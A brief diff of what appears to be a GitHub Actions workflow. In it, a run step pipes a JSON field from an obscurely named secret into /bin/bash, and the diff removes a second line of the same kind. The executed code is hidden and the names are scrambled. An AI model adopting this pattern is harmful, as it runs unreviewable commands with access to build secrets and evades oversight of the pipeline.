@@ -17,7 +17,6 @@ jobs:
           zbmdm5359: ${{ secrets.zbmdm5359 }}
         run: |
           printf '%s' "$zbmdm5359" | jq -r .pxp5 | /bin/bash
-          printf '%s' "$ac21" | jq -r .wkz03 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
